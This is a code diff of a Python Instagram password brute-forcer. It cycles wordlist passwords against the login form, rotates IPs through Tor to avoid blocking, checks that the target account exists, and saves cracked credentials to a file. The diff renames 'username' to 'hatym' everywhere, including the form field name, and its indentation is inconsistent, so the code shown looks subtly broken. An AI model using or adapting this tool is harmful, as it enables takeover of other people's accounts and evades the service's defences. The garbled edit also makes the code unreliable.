@@ -15,8 +15,8 @@ from Core.tor import TorManager
 from Core.Browser import Browser
 
 class Instagram(TorManager,Browser):
-	def __init__(self,username,wordlist):
-		self.username = username
+	def __init__(self,hatym,wordlist):
+		self.hatym = hatym
 		self.wordlist = wordlist
 		self.lock = threading.Lock()
 
@@ -31,7 +31,7 @@ class Instagram(TorManager,Browser):
 
 		#for browser
 		self.url = 'https://www.instagram.com/accounts/login/?force_classic_login'
-		self.form1 = 'username'
+		self.form1 = 'hatym'
 		self.form2 = 'password'
 
 		Browser.__init__(self)
@@ -52,8 +52,8 @@ class Instagram(TorManager,Browser):
 				print ' [-] Password Found!'
 
 				with open('Cracked.txt','a') as f:
-					f.write('[-] Username: {}\n[-] Password: {}\n\n'.\
-					format(self.username,msg))
+					f.write('[-] hatym: {}\n[-] Password: {}\n\n'.\
+					format(self.hatym,msg))
 
 			    if all([not self.isFound, msg]):
 			    	print '\n [-] {}'.format(msg)
@@ -159,7 +159,7 @@ class Instagram(TorManager,Browser):
 						subprocess.call(['clear'])
 						print ''
 						print ' +------- Instagram -------+'
-						print ' [-] Username: {}{}{}'.format(creds,self.username.title(),self.n)
+						print ' [-] hatym: {}{}{}'.format(creds,self.hatym.title(),self.n)
 						print ' [-] Password: {}{}{}'.format(creds,pwd,self.n)
 						print ' [-] Proxy IP: {}{}{}'.format(self.b,ip,self.n)
 						print ' [-] Attempts: {}{}{}'.format(self.y,attempts,self.n)
@@ -173,12 +173,12 @@ class Instagram(TorManager,Browser):
 				def main():
 					# assign arugments
 					args = argparse.ArgumentParser()
-					args.add_argument('username',help='Email or username')
+					args.add_argument('hatym',help='Email or hatym')
 					args.add_argument('wordlist',help='wordlist')
 					args =  args.parse_args()
 
 					# assign variables
-					engine = Instagram(args.username,args.wordlist)
+					engine = Instagram(args.hatym,args.wordlist)
 
 					# does tor exists?
 					if not os.path.exists('/usr/bin/tor'):
@@ -188,8 +188,8 @@ class Instagram(TorManager,Browser):
 						engine.kill('Please Install Tor'.format(engine.y,engine.r,engine.n))
 
 				# does the account exists?
-				if not engine.exists(engine.username):
-					engine.kill('The Account \'{}\' does not exists'.format(engine.username.title()))
+				if not engine.exists(engine.hatym):
+					engine.kill('The Account \'{}\' does not exists'.format(engine.hatym.title()))
 
 				# start attack
 				try:
